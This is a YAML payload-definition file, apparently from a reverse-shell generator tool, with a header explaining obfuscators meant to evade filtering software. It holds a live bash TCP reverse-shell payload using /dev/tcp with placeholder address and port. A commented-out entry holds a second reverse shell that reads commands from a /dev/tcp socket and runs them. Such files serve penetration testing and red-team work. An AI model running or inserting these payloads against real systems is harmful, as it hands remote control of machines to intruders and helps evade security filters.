---

# This file defines all kinds of obfuscators to run against shell commands.
# Shells could be any of bash, sh, zsh, csh, cmd, PowerShell, etc...
#
# The purpose of command obfuscator is:
#   1. to eliminate any kind of badchars used by the payload (or use a different set of chars)
#   2. hide/obfuscate the code to bypass filtering software
#
# -------------------------------------------------------------------------------------------------
# Available variables:
#   {PAYLOAD}                # The payload string that will be replaced in here
#                            # so that the obfuscator can use it.
#                            # NOTE: Can only be used within payload key
#
# -------------------------------------------------------------------------------------------------
# Required root keys:
#   type: str                # Obfuscator type
#   version: str             # Current version (bumps on changes)
#   encoders: List[dict]     # List of used encoder function
#
# -------------------------------------------------------------------------------------------------
# Required item keys:
#   name: str                # display name
#   desc: str                # short description
#   filters: dict            # <see below>
#   payload: str             # the obfuscator code (The {PAYLOAD} variable must be used here)
#   meta: dict               # <see below>
#
# -------------------------------------------------------------------------------------------------
# Required item filters:
#   shells: List[str]        # For what underlying shells does this obfuscator code work?
#                            # NOTE: This is independent of the actual payload code.
#                            # Shell filter will be an intersectional set of
#                            # obfuscator and payload.
#
#   commands: List[str]      # Required shell commands for the obfuscator
#                            # NOTE: This will be summed up with the required shell
#                            # commands used by the payload
#
#   obfuscator: List[str]    # List of used obfuscator functions
#                            # NOTE: this is only used for filtering / output display
#
# -------------------------------------------------------------------------------------------------
# Required meta keys:
#   authors: List[str]       # List of authors who have worked on it
#   created: str             # Initial creation date
#   modified: str            # Modification date
#   version: str             # obfuscator version (bumps on change)


# Meta definitions
type: cmd
command: bash
version: 0.0.1

# Payload list
payloads:
  - name: tcp-reverse-bash
    desc: TCP reverse shell with bash command
    info: []
    meta:
      authors: ["cytopia"]
      created: "2021-04-08"
      modified: "2021-04-08"
      version: 0.0.1
    filters:
      # exe:   will be populated by 'command' from root level
      cmd_exe: "{VAR:shell}{VAR:minus_i}"
      cmd_shell: "{VAR:shell}{VAR:minus_i}"
      shell: bash
      shells: ["bash", "zsh"]      # From which shells can it be run?
      os: ["linux", "mac"]  # On which OS can it be run?
      commands: ["bash"]           # What commands are required to run?
      encoders: []
      proto: tcp
      direction: reverse
    variables:
      - name: minus_i
        values:
          - value: " -i"
          - value: ""
      - name: shell
        values:
          - value: bash
          - value: /bin/bash
    payload: |-
      {VAR:shell}{VAR:minus_i}>&/dev/tcp/__ADDR__/__PORT__ 0>&1
#
#  - name: tcp-reverse-bash
#    desc: TCP reverse shell with bash command
#    info: []
#    meta:
#      authors: ["cytopia"]
#      created: "2021-04-08"
#      modified: "2021-04-08"
#      version: 0.0.1
#    filters:
#      cmd_exe: bash
#      cmd_shell: bash
#      shell: bash
#      shells: ["bash"]      # From which shells can it be run?
#      os: ["linux", "mac"]  # On which OS can it be run?
#      commands: ["exec", "cat", "read", "while"]           # What commands are required to run?
#      encoders: []
#      proto: tcp
#      direction: reverse
#    variables: []
#    payload: |-
#      __CODE__
#
## exec 5<>/dev/tcp/__ADDR__/__PORT__;cat <&5 | while read line; do $line 2>&5 >&5; done
